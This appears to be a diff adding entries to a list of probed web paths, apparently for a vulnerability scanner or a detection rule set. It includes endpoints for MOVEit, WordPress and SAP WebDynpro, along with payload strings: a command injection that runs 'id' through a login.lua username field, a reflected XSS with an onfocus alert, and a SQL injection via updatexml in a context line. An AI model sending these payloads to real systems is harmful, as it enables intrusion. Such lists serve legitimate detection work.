@@ -899,3 +899,11 @@
 /administrator/manifests/files/joomla.xml
 /jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)::
 /auth/newpassword
+/moveitisapi/moveitisapi.dll?action=capa
+/wp-content/plugins/local-sync/README.txt
+/cgi-bin/login.lua?action=login&password=x&username=%22;id;echo%20%22
+/webshell4/login.php?errcode=0&login=\%22%20onfocus=alert(document.domain);%20autofocus%20\%22&err=U
+/webdynpro/resources/sap.com/tc~eu~jwf~wdgp/JWFTestAddAssignees
+/webdynpro/dispatcher/sap.com/tc~eu~jwf~wdgp/com.sap.workflow.wdgp.general.test.JWFTestAddAssignees
+/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Chat
+/webdynpro/resources/sap.com/tc~rtc~coll.appl.rtc~wd_chat/Messages
